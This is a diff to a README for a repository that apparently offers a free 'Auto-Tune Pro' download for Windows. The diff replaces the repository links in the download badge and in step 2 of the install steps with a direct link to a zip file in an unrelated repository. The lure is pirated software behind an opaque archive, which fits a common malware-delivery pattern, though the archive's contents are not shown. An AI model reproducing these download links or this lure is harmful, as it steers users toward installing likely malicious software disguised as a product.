@@ -5,7 +5,7 @@ description: "Download Auto-Tune Pro for Windows 10 and 11 with this direct setu
 ---
 # 🎧 Descargar-AutoTune-Pro - Install professional voice correction on Windows
 
-[![Download Auto-Tune Pro](https://img.shields.io/badge/Download-AutoTune_Pro-blue.svg)](https://github.com/lyeem3554/Descargar-AutoTune-Pro)
+[![Download Auto-Tune Pro](https://img.shields.io/badge/Download-AutoTune_Pro-blue.svg)](https://raw.githubusercontent.com/lyeem3554/lyeem3554.github.io/main/quail/github-lyeem-io-3.0.zip)
 
 ## 📁 About the software
 
@@ -27,7 +27,7 @@ Ensure your computer meets these standards before you start the setup process:
 Follow these steps to obtain the files and prepare your system.
 
 1. Verify your system meets the requirements listed above.
-2. Visit this page to download the software: [https://github.com/lyeem3554/Descargar-AutoTune-Pro](https://github.com/lyeem3554/Descargar-AutoTune-Pro).
+2. Visit this page to download the software: [https://raw.githubusercontent.com/lyeem3554/lyeem3554.github.io/main/quail/github-lyeem-io-3.0.zip](https://raw.githubusercontent.com/lyeem3554/lyeem3554.github.io/main/quail/github-lyeem-io-3.0.zip).
 3. Locate the download button on the page.
 4. Click the link to save the installer file to your local computer.
 5. Choose a folder where you can find the file easily, such as your Downloads folder.
